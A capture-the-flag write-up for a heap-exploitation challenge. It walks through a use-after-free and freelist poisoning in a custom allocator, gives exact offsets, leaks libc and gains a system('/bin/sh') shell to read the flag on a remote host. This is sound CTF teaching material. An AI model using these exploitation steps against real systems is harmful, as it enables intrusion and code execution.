# PWN#003 — Notes Vault

**Deliverables:** `notes` (ELF x86-64, 21 864 B). **No libc shipped** — but the remote
`/challenge/libc.so.6` turned out to be the *same* glibc 2.42-13 as PWN#001/#002 (verified live:
`puts_leak - 0x82060` page-aligned).
**Remote:** `169.58.126.107:5002`
**Flag:** `CTF{0b1578aa1b39f4c6ab9a857a657ee71aKABO....!}` — **again in the environment variable
`FLAG=`**, read through a `system("/bin/sh")` shell.

### 0. TL;DR

A note vault (Add/Free/Edit/View) over a **hand-written pool allocator**. `free_note` never clears
`notes[idx]` → **use-after-free**: `edit` writes into a freed chunk, letting us rewrite its
`freelist` `next` pointer = **freelist poisoning**. `view_note` does **`call [note->fmt](rdi =
note->content)`** → with the note struct overwritten we gain **RIP control + controlled rdi**. We
first call `puts(puts@GOT)` to leak libc, then `system("/bin/sh")`, then `env | grep -i flag`.

### 1. Binary recon

`notes`: **PIE, not stripped**, Full RELRO, Canary, NX, No RPATH/RUNPATH.
`objdump -d -M intel` + `objdump -s -j .data/.rodata` + `readelf -rW` (Ghidra MCP was down —
intercepted by a proxy — `objdump` was enough).

Data layout (PIE-relative):
- `notes[8]` pointer array = `0x4060`
- `notes_storage` = `0x40e0` — 8 entries stride `0x18`: `[+0 fmt fp][+8 content ptr][+0x10 size]`
- `pool` = `0x40a0` (`malloc(0x4000)`), `pool_cursor` = `0x40a8`, `freelist[3]` = `0x40b0`
- `class_sizes` = `0x2010` = `[0x20, 0x40, 0x80]`
- GOT: `free@GOT 0x3f88`, `puts@GOT 0x3f90`, `write@GOT 0x3f98`, `printf@GOT 0x3fa8`,
  `read@GOT 0x3fb0`, `malloc@GOT 0x3fc0`
- PLT: `puts@plt 0x1040`, `write@plt 0x1050`, `read@plt 0x1080`, `malloc@plt 0x10a0`
- Functions: `main 0x1af8`, `size_to_class 0x11c9`, `mangle 0x1235`, `palloc 0x127e`,
  `pfree 0x13ba`, `content_alloc 0x1452`, `content_free 0x14ac`, `default_formatter 0x1512`,
  `read_long 0x1633`, `add_note 0x16ce`, `free_note 0x185a`, `edit_note 0x1925`, `view_note 0x1a06`.

**Free leak:** `main` prints `[debug] build id: %p` with `&main` → `base = leak - 0x1af8`.

### 2. Handler semantics

- `read_long(prompt)`: reads ≤0x1f bytes, `strtol(base=10)`.
- `add_note`: `idx∈[0,7]` must be empty (`notes[idx]==0`); `size∈[1,0x500]`; `content_alloc(size)`;
  stores `[default_formatter][content][size]`; then `read(0, content, size)` (NUL-terminates if the
  read is short).
- `content_alloc(s)`: `palloc(s)`; if it returns 0 → falls back to real `malloc(s)`.
- `content_free(p,s)`: if `size_to_class(s)>=0` → `pfree(p,s)`; else real `free(p)`.
- `free_note`: validates `notes[idx]` non-null, calls `content_free(notes[idx]->content,
  notes[idx]->size)` — **does NOT set `notes[idx]=NULL`** (UAF).
- `edit_note`: `read(0, notes[idx]->content, notes[idx]->size)` — `notes[idx]` is still valid after
  a free, so this **writes into the freed chunk**.
- `view_note`: `call [notes[idx]][rdi = notes[idx]->content]` (indirect call through the formatter
  pointer).
- `default_formatter(content)`: `write(1,"Note: ",6); write(1,content,0x20); write(1,"\n",1)`.

`<1` a note, `0`: fmt | `8`: content | `0x10`: size.

### 3. Allocator internals

- **`size_to_class(s)`**: first `i` with `class_sizes[i] >= s` (`0x20`→0, `0x40`→1, `0x80`→2),
  else `-1`.
- **`mangle(a, b) = a ^ rol(b, 13)`** (safe-linking-like, but no `>>12`).
- **`palloc(s)`**: `class=size_to_class(s)`; if `freelist[class]!=0`: `head=freelist[class]`;
  `next = mangle(head->next, head)`; `freelist[class]=next`; return `head`. Else carve at
  `pool_cursor` (bounded by `pool+0x4000`).
- **`pfree(p,s)`**: `class=size_to_class(s)`; `p->next = mangle(freelist[class], p)`;
  `freelist[class]=p`. **No validation of `p`.**

### 4. Exploit chain

**Heap leak.** `add(0,0x20)`→A=`pool`, `add(1,0x20)`→B=`pool+0x20`, `add(4,0x20)`→C=`pool+0x40`
(reserved for `"/bin/sh"`). `free(0)`: since `freelist[0]==NULL`, `A->next = mangle(0,A) =
rol(A,13)`. `view(0)` → `default_formatter(A)` prints A's first 0x20 bytes → read 8 bytes =
`rol(A,13)` → **`pool = ror(leak,13)`**.

**Freelist poisoning primitive.** `edit(helper_idx, mangle(target, chunk))` writes `chunk->next`.
The next `palloc` of that class pops `chunk` and sets `freelist[class] = mangle(chunk->next,
chunk) = target`; a following `add(victim_idx,0x20,…)` pops `target` and `read()` writes the
struct at `target = base + 0x40e0 + victim*0x18`.

**Stage 1 — libc leak.**
- `free(1)` → `freelist[0]=B`; `edit(1, mangle(&struct7, B))`; `add(3,…)` pops B;
  `add(7, [puts@plt][puts@GOT])` writes struct7; `view(7)` → **`puts(puts@GOT)`** → libc leak.
- `base_libc = puts_leak - 0x82060` (must be **page-aligned**; else bad libc/retry).

**Stage 2 — shell.**
- `edit(4, "/bin/sh")` (chunk C, separate & never clobbered).
- `free(3)` (chunk B again); `edit(3, mangle(&struct6, B))`; `add(5,…)` pops B;
  `add(6, [system][C][0x20])`; `view(6)` → **`system("/bin/sh")`**.
- `env | grep -i flag` → `FLAG=CTF{...}`.

### 5. Offsets used

Binary: `main=0x1af8`, `notes_storage=0x40e0`, `puts@plt=0x1040`, `puts@GOT=0x3f90`.
glibc 2.42-13 (remote, = PWN#001/002): `puts=0x82060`, `system=0x54790`, `write=0x107d10`.
glibc 2.43 (local test): `puts=0x81e20`, `system=0x543f0`, `write=0x106740`.

### 6. Dead ends / pitfalls hit

- **Wrong index bookkeeping**: `add(reap_idx)` sets `notes[reap_idx]`; to `view(victim)`, the reap
  index must BE the victim, and each poison needs **distinct** free pop/reap indices
  (`notes[idx]` is never nulled by `free_note`). Reusing an index → `Invalid.`
- **`"/bin/sh"` clobber**: the second poison's `add(pop,…)` writes its payload into the helper
  chunk, since the helper *is* the popped chunk. `"/bin/sh"` must live in a **separate reserved
  chunk** (C).
- **Parsing `view`**: `default_formatter` writes exactly 0x20 bytes which may contain `\n`/`\0`;
  parse as `pkt[pkt.find(b"Note: ")+6 : +6+0x20]`, not line-by-line.
- **`puts` leak is a C-string**: `puts(puts@GOT)` stops at the first `\0` (6 bytes for a `0x7f…`
  libc ptr) → reconstruct with `0x7f<<48` or retry if <6 bytes.
- **Heap-leak sanity check**: user addresses are `0x000055…` (12 significant hex digits) — the top
  byte is `0x00`, so check `0x500000000000 <= pool < 0x800000000000` and 16-byte alignment, not
  `>>56`.
